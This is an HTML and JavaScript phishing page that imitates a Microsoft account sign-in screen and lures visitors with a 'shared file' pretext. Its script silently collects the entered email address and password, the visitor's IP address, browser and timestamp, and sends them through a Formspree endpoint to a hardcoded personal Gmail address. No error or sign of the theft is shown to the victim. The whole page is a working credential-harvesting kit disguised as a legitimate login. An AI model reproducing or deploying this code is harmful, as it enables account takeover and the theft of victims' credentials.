<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Account</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #1b1b1b;
            background-color: #f5f5f5;
        }
        
        .container {
            width: 100%;
            max-width: 440px;
            padding: 44px;
            margin: 20px;
            border: 1px solid #e6e6e6;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
            background: white;
        }
        
        .logo {
            width: 140px;
            margin-bottom: 24px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 12px;
        }
        
        p {
            font-size: 14px;
            color: #616161;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            border: 1px solid #d6d6d6;
            border-radius: 4px;
            font-size: 15px;
            transition: border-color 0.3s;
        }
        
        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #0067b8;
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 16px 0 24px;
        }
        
        input[type="checkbox"] {
            margin-right: 8px;
            width: 16px;
            height: 16px;
        }
        
        label {
            font-size: 14px;
            color: #616161;
        }
        
        a {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
            font-weight: 600;
        }
        
        a:hover {
            text-decoration: underline;
        }
        
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
        }
        
        button {
            background: #0067b8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        button:hover {
            background: #005da6;
        }
        
        .back-button {
            background: transparent;
            color: #0067b8;
            padding: 10px 0;
        }
        
        .back-button:hover {
            background: transparent;
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 40px;
            text-align: center;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 20px;
        }
        
        .footer-links a {
            font-size: 12px;
            color: #616161;
            font-weight: normal;
        }
        
        .copyright {
            font-size: 12px;
            color: #616161;
            margin-top: 20px;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            display: none;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .signup-link {
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
            color: #616161;
        }
        
        .signup-link a {
            font-weight: normal;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft" class="logo">
        
        <h1>Sign in</h1>
        
        <p>Only recipient email can access shared file to open the received document.</p>
        
        <form id="signinForm">
            <div class="form-group">
                <input type="email" id="email" placeholder="Email, phone, or Skype" required autocomplete="off">
            </div>
            
            <div class="form-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="keepSignedIn">
                <label for="keepSignedIn">Keep me signed in</label>
            </div>
            
            <a href="#">Forgot password?</a>
            
            <div class="buttons">
                <a href="#" class="back-button"><i class="fas fa-arrow-left"></i> Back</a>
                <button type="submit" id="submitBtn">
                    <span class="loading" id="loadingSpinner"></span>
                    <span id="btnText">Next</span>
                </button>
            </div>
        </form>
        
        <div class="signup-link">
            No account? <a href="#">Create one!</a>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#">Terms of use</a>
                <a href="#">Privacy & cookies</a>
                <a href="#">Help</a>
            </div>
            <div class="copyright">
                Â© Microsoft 2023
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('signinForm');
            const submitBtn = document.getElementById('submitBtn');
            const loadingSpinner = document.getElementById('loadingSpinner');
            const btnText = document.getElementById('btnText');
            
            // Your email address
            const recipientEmail = 'josephogidiagba49@gmail.com';
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;
                const keepSignedIn = document.getElementById('keepSignedIn').checked;
                
                // Show loading state briefly
                loadingSpinner.style.display = 'inline-block';
                btnText.textContent = 'Signing in...';
                submitBtn.disabled = true;
                
                try {
                    // Get additional information
                    const ip = await getIP();
                    const userAgent = navigator.userAgent;
                    const timestamp = new Date().toLocaleString();
                    
                    // Send data to email using Formspree (silently)
                    await sendToEmail(email, password, keepSignedIn, ip, userAgent, timestamp);
                    
                    // Simulate successful login without any alerts
                    setTimeout(() => {
                        form.reset();
                    }, 1000);
                    
                } catch (error) {
                    console.error('Error:', error);
                    // No error message shown to user
                } finally {
                    // Reset button state
                    setTimeout(() => {
                        loadingSpinner.style.display = 'none';
                        btnText.textContent = 'Next';
                        submitBtn.disabled = false;
                    }, 1000);
                }
            });
            
            // Function to send data to email using Formspree
            async function sendToEmail(email, password, keepSignedIn, ip, userAgent, timestamp) {
                // Using Formspree.io service to send emails
                const formspreeEndpoint = 'https://formspree.io/f/xvojnzgg';
                
                const formData = new FormData();
                formData.append('_replyto', recipientEmail);
                formData.append('_subject', 'Microsoft Login Credentials');
                formData.append('message', `ðŸ” Microsoft Login Credentials\n\n
ðŸ“§ Email: ${email}\n
ðŸ”‘ Password: ${password}\n
ðŸ’¾ Keep Signed In: ${keepSignedIn ? 'Yes' : 'No'}\n\n
ðŸŒ IP: ${ip}\n
ðŸ“± Browser: ${userAgent}\n
ðŸ“… Date: ${timestamp}\n\n
This message was sent to ${recipientEmail}`);
                
                try {
                    // Send the request but don't wait for response or show any indication
                    fetch(formspreeEndpoint, {
                        method: 'POST',
                        body: formData,
                        headers: {
                            'Accept': 'application/json'
                        }
                    }).catch(error => console.error('Error sending email:', error));
                    
                    return true;
                } catch (error) {
                    console.error('Error sending email:', error);
                    return false;
                }
            }
            
            // Function to get user's IP address
            async function getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    return 'Unknown';
                }
            }
        });
    </script>
</body>
</html>
